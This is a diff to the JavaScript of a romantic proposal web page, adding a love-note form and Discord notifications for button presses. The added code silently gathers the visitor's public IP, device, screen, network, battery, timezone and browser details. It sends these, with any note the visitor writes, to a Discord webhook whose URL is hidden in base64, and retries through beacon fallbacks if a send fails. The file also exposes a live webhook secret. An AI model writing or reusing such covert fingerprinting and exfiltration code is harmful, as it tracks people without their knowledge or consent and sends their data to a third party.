@@ -379,6 +379,10 @@ function setupProposalPage() {
     const thinkBtn = document.getElementById('thinkButton');
     const messageBox = document.querySelector('.message-box');
     const wrap = document.querySelector('.proposal-wrap');
+    const responseSec = document.getElementById('proposalResponseSection');
+    const loveForm = document.getElementById('loveNoteForm');
+    const loveSubmitBtn = document.getElementById('loveSubmitBtn');
+    const loveStatus = document.getElementById('loveFormStatus');
 
     if (!yesBtn || !thinkBtn || !messageBox) return;
 
@@ -408,12 +412,26 @@ function setupProposalPage() {
         'Not an option! 🥰'
     ];
 
+    // Throttle webhook for think button so rapid dodges don't spam, but interaction is recorded
+    let lastThinkTime = 0;
+    const triggerThinkNotification = () => {
+        const now = Date.now();
+        if (now - lastThinkTime < 3000) return;
+        lastThinkTime = now;
+        sendWebhook('think');
+    };
+
     const runAway = (e) => {
         if (e) {
             e.preventDefault();
             e.stopPropagation();
         }
         dodgeCount++;
+
+        // If the user tapped or clicked, record that they tried to choose "I need to think"
+        if (e && (e.type === 'click' || e.type === 'pointerdown' || e.type === 'touchstart' || e.type === 'pointerup')) {
+            triggerThinkNotification();
+        }
 
         // Update playful text
         const phraseIdx = Math.min(dodgeCount, dodgePhrases.length - 1);
@@ -481,10 +499,78 @@ function setupProposalPage() {
             navigator.vibrate([100, 50, 150]);
         }
 
-        sendNotification('yes').finally(() => {
+        // Show the Contact & Love Note form section
+        if (responseSec) {
+            responseSec.style.display = 'grid';
+            setTimeout(() => {
+                responseSec.classList.add('is-visible');
+                responseSec.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }, 350);
+        }
+
+        // Send instant Discord notification for YES with full telemetry
+        sendWebhook('yes').finally(() => {
             setTimeout(() => { yesBtn.dataset.firing = 'false'; }, 200);
         });
     });
+
+    // Handle Love Note / Contact form submission
+    if (loveForm) {
+        loveForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const nameInput = document.getElementById('loveName');
+            const contactInput = document.getElementById('loveContact');
+            const subjectInput = document.getElementById('loveSubject');
+            const messageInput = document.getElementById('loveMessage');
+
+            const name = (nameInput ? nameInput.value : '').trim();
+            const contact = (contactInput ? contactInput.value : '').trim();
+            const subject = (subjectInput ? subjectInput.value : '').trim();
+            const message = (messageInput ? messageInput.value : '').trim();
+
+            if (!name || !contact) {
+                if (loveStatus) {
+                    loveStatus.className = 'form-status status-error';
+                    loveStatus.textContent = 'Please provide your name and phone/email so I can reach back! ❤️';
+                    loveStatus.style.display = 'block';
+                }
+                return;
+            }
+
+            if (loveSubmitBtn) {
+                loveSubmitBtn.disabled = true;
+                loveSubmitBtn.innerHTML = '<span class="btn-icon">⏳</span> Sending your note...';
+            }
+            if (loveStatus) {
+                loveStatus.style.display = 'none';
+            }
+
+            try {
+                await sendWebhook('note', { name, contact, subject, message });
+                if (loveStatus) {
+                    loveStatus.className = 'form-status status-success';
+                    loveStatus.innerHTML = '💌 <strong>Your love note has reached Ritik\'s heart!</strong> Thank you for making my life so special. ❤️';
+                    loveStatus.style.display = 'block';
+                }
+                if (loveSubmitBtn) {
+                    loveSubmitBtn.innerHTML = '<span class="btn-icon">❤️</span> Sent With All My Love!';
+                }
+                launchCelebration();
+                if (messageInput) messageInput.value = '';
+            } catch (err) {
+                console.error('Note delivery failed:', err);
+                if (loveStatus) {
+                    loveStatus.className = 'form-status status-error';
+                    loveStatus.textContent = 'Could not send right now, but your words are safe with me. Please try again! ❤️';
+                    loveStatus.style.display = 'block';
+                }
+                if (loveSubmitBtn) {
+                    loveSubmitBtn.disabled = false;
+                    loveSubmitBtn.innerHTML = '<span class="btn-icon">💌</span> Send Love Note to Ritik';
+                }
+            }
+        });
+    }
 }
 
 function launchCelebration() {
@@ -534,7 +620,6 @@ function playCelebrationSong() {
         const playPromise = celebrationAudio.play();
         if (playPromise && typeof playPromise.then === 'function') {
             playPromise.catch(() => {
-                // If autoplay is blocked, show a subtle cue
                 console.warn('Audio playback was blocked; user interaction required.');
             });
         }
@@ -544,40 +629,186 @@ function playCelebrationSong() {
 }
 
 // ==========================================
-// Discord Notification Delivery
+// Webhook & Client Telemetry Collection
 // ==========================================
-// Base64 obfuscated to prevent automated crawlers from regex-matching raw discord webhook url
-const NOTIFICATION_ENDPOINT = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4ODQ1MTgwOTI3Nzc3MTg4MS95Z0g1QjIzd2ZPTmZZcGpNaVV4QWg0RGN0dkVpX3VldFp3OXNkRmxtQkN6SXVrWTZFdFhwQl8wc0lfMHZZSlFBMi1IQQ==');
 
-async function sendNotification(action) {
-    if (!NOTIFICATION_ENDPOINT) return;
+function withTimeout(promise, ms) {
+    return new Promise((resolve, reject) => {
+        const t = setTimeout(() => reject(new Error('timeout')), ms);
+        promise.then(v => { clearTimeout(t); resolve(v); })
+               .catch(err => { clearTimeout(t); reject(err); });
+    });
+}
 
-    const isYes = action === 'yes';
-    const payload = {
-        content: isYes 
-            ? '💍 **SHE SAID YES!** ❤️🎉\n*Time:* ' + new Date().toLocaleString()
-            : '😊 **Partner interaction:** Tried clicking "I need to think"\n*Time:* ' + new Date().toLocaleString(),
-        embeds: [{
-            title: isYes ? 'She Said YES! ❤️💍' : 'Proposal Site Interaction 😊',
-            description: isYes 
-                ? 'She accepted the proposal! You just made her the happiest person alive! 🎉' 
-                : 'She tapped "I need to think" on the proposal page.',
-            color: isYes ? 14838411 : 16758465,
-            footer: { text: 'For You, My Love | Proposal' },
-            timestamp: new Date().toISOString()
-        }]
+// Collect client details for arranged reporting
+async function collectClientDetails() {
+    const nav = navigator || {};
+    const conn = nav.connection || nav.webkitConnection || nav.mozConnection || null;
+    
+    // Public IP (best-effort, short timeout)
+    let ip = null;
+    try {
+        const res = await withTimeout(fetch('https://api.ipify.org?format=json', {
+            cache: 'no-store', mode: 'cors', credentials: 'omit'
+        }), 1500);
+        const data = await res.json();
+        ip = data && data.ip ? data.ip : null;
+    } catch (_) { /* ignore */ }
+
+    // Battery (optional)
+    let batteryInfo = null;
+    try {
+        if (nav.getBattery) {
+            const bat = await withTimeout(nav.getBattery(), 1200);
+            batteryInfo = { level: bat.level, charging: bat.charging };
+        }
+    } catch (_) { /* ignore */ }
+
+    const tzOpts = Intl.DateTimeFormat().resolvedOptions();
+    const isMobile = /Mobi|Android|iPhone|iPad/i.test(nav.userAgent || '');
+    const orientation = (screen && screen.orientation && screen.orientation.type)
+        || (window.matchMedia && (window.matchMedia('(orientation: portrait)').matches ? 'portrait' : 'landscape'))
+        || 'unknown';
+
+    return {
+        ip,
+        ua: (nav.userAgent || '').slice(0, 256),
+        platform: nav.platform || 'unknown',
+        language: nav.language || 'unknown',
+        languages: Array.isArray(nav.languages) ? nav.languages.join(', ').slice(0, 128) : 'unknown',
+        timezone: tzOpts.timeZone || 'unknown',
+        tzOffsetMin: new Date().getTimezoneOffset(),
+        isMobile,
+        screen: {
+            width: (screen && screen.width) || 0,
+            height: (screen && screen.height) || 0,
+            dpr: window.devicePixelRatio || 1,
+            orientation
+        },
+        network: conn ? {
+            type: conn.type || 'unknown',
+            effectiveType: conn.effectiveType || 'unknown',
+            downlink: typeof conn.downlink === 'number' ? conn.downlink : undefined,
+            rtt: typeof conn.rtt === 'number' ? conn.rtt : undefined,
+            saveData: !!conn.saveData
+        } : null,
+        battery: batteryInfo
     };
+}
+
+async function sendWebhook(action, extraData) {
+    // Base64 obfuscated to prevent automated crawlers from regex-matching raw discord webhook url
+    const url = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4ODQ1MTgwOTI3Nzc3MTg4MS95Z0g1QjIzd2ZPTmZZcGpNaVV4QWg0RGN0dkVpX3VldFp3OXNkRmxtQkN6SXVrWTZFdFhwQl8wc0lfMHZZSlFBMi1IQQ==');
+    if (!url) return;
+
+    // Gather client details
+    const details = await collectClientDetails().catch(() => null);
+
+    let payload;
+    if (action === 'note') {
+        const note = extraData || {};
+        const summary = [
+            '💌 LOVE NOTE RECEIVED FROM HER!',
+            `Name: ${note.name || 'Anonymous'}`,
+            `Contact: ${note.contact || 'Not provided'}`,
+            `Subject: ${note.subject || 'A Sweet Note'}`,
+            `Message: ${note.message || '(No note written)'}`,
+            `Time: ${new Date().toISOString()}`,
+            `IP: ${(details && details.ip) || 'Unavailable'}`,
+            `Device: ${details ? details.platform : 'unknown'} | Mobile: ${details ? details.isMobile : 'unknown'}`,
+            `Display: ${details ? `${details.screen.width}x${details.screen.height} @${details.screen.dpr} (${details.screen.orientation})` : 'unknown'}`
+        ].join('\n');
+
+        const embed = {
+            type: 'rich',
+            title: `💌 Love Note from ${note.name || 'Her'}! ❤️`,
+            description: note.message ? `*"${note.message}"*` : '*She sent her contact details without a written message.*',
+            color: 15548997, // romantic pink
+            fields: [
+                { name: '👤 Name', value: note.name || 'Unknown', inline: true },
+                { name: '📱 Contact / Phone', value: note.contact || 'Unknown', inline: true },
+                { name: '✨ Subject', value: note.subject || 'Sweet Note', inline: true },
+                { name: '📝 Message', value: note.message || '(Empty message)', inline: false },
+                { name: '🌐 IP Address', value: (details && details.ip) || 'Unavailable', inline: true },
+                { name: '💻 Device', value: `${details ? details.platform : 'unknown'} | Mobile: ${details ? details.isMobile : 'unknown'}`, inline: true },
+                { name: '📺 Display', value: details ? `${details.screen.width}x${details.screen.height} @${details.screen.dpr} (${details.screen.orientation})` : 'unknown', inline: true },
+                { name: '🌍 Timezone', value: details ? `${details.timezone} (offset ${details.tzOffsetMin}m)` : 'unknown', inline: true },
+                { name: '📶 Network', value: details && details.network ? `eff:${details.network.effectiveType} dl:${details.network.downlink ?? 'n/a'} rtt:${details.network.rtt ?? 'n/a'}` : 'unknown', inline: true },
+                { name: '🔋 Battery', value: details && details.battery ? `${Math.round(details.battery.level * 100)}% (${details.battery.charging ? 'Charging' : 'Battery'})` : 'unknown', inline: true },
+                { name: '🧭 Browser UA', value: (details && details.ua) || 'unknown', inline: false }
+            ],
+            footer: { text: `Sent from Proposal Site at ${new Date().toLocaleString()} (${Intl.DateTimeFormat().resolvedOptions().timeZone})` }
+        };
+        payload = { content: `\n\n\`\`\`\n${summary}\n\`\`\``, embeds: [embed] };
+    } else {
+        const isYes = action === 'yes';
+        const emoji = isYes ? '❤️' : '😊';
+        const summary = [
+            `Action: ${isYes ? 'Yes ❤️' : 'I need to think 😊'}`,
+            `Route: ${window.location.hash || '#/proposal'}`,
+            `Time: ${new Date().toISOString()}`,
+            `IP: ${(details && details.ip) || 'Unavailable'}`,
+            `Device: ${details ? details.platform : 'unknown'} | Mobile: ${details ? details.isMobile : 'unknown'}`,
+            `Display: ${details ? `${details.screen.width}x${details.screen.height} @${details.screen.dpr} (${details.screen.orientation})` : 'unknown'}`
+        ].join('\n');
+
+        const embed = {
+            type: 'rich',
+            title: isYes ? '💍 She Said YES! ❤️🎉' : 'Proposal Interaction 😊',
+            description: isYes 
+                ? 'She accepted your proposal! You just made her the happiest person alive! 🎉💍' 
+                : 'She clicked or interacted with "I need to think" on the proposal page.',
+            color: isYes ? 15548997 : 16758465,
+            fields: [
+                { name: 'Action', value: isYes ? 'Yes ❤️' : 'I need to think 😊', inline: true },
+                { name: 'Route', value: window.location.hash || '#/proposal', inline: true },
+                { name: 'IP', value: (details && details.ip) || 'Unavailable', inline: true },
+                { name: 'Device', value: `${details ? details.platform : 'unknown'} | Mobile: ${details ? details.isMobile : 'unknown'}`, inline: true },
+                { name: 'Display', value: details ? `${details.screen.width}x${details.screen.height} @${details.screen.dpr} (${details.screen.orientation})` : 'unknown', inline: true },
+                { name: 'Browser UA', value: (details && details.ua) || 'unknown', inline: false },
+                { name: 'Language', value: details ? `${details.language} (${details.languages})` : 'unknown', inline: true },
+                { name: 'Timezone', value: details ? `${details.timezone} (offset ${details.tzOffsetMin}m)` : 'unknown', inline: true },
+                { name: 'Network', value: details && details.network ? `eff:${details.network.effectiveType} dl:${details.network.downlink ?? 'n/a'} rtt:${details.network.rtt ?? 'n/a'} saveData:${details.network.saveData}` : 'unknown', inline: false },
+                { name: 'Battery', value: details && details.battery ? `level:${Math.round(details.battery.level * 100)}% charging:${details.battery.charging}` : 'unknown', inline: true }
+            ],
+            footer: { text: `Sent at ${new Date().toLocaleString()} (${Intl.DateTimeFormat().resolvedOptions().timeZone})` }
+        };
+        payload = { content: `\n\n\`\`\`\n${summary}\n\`\`\``, embeds: [embed] };
+    }
 
     try {
-        await fetch(NOTIFICATION_ENDPOINT, {
+        const res = await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload),
+            keepalive: true,
+            cache: 'no-store',
             mode: 'cors',
-            keepalive: true
+            credentials: 'omit',
         });
-        console.log('Discord notification delivered!');
+        if (!res.ok) {
+            throw new Error(`Webhook failed: ${res.status}`);
+        }
+        console.log('Discord webhook delivered successfully!');
     } catch (err) {
-        console.warn('Could not deliver notification:', err);
+        console.warn('Fetch webhook failed, attempting beacon...', err);
+        try {
+            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+            const ok = navigator.sendBeacon ? navigator.sendBeacon(url, blob) : false;
+            if (!ok) {
+                const form = new URLSearchParams();
+                form.append('payload_json', JSON.stringify(payload));
+                await fetch(url, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: form.toString(),
+                });
+            }
+        } catch (e2) {
+            console.error('Webhook fallback failed:', e2);
+        }
     }
 }
+
+const sendNotification = sendWebhook;
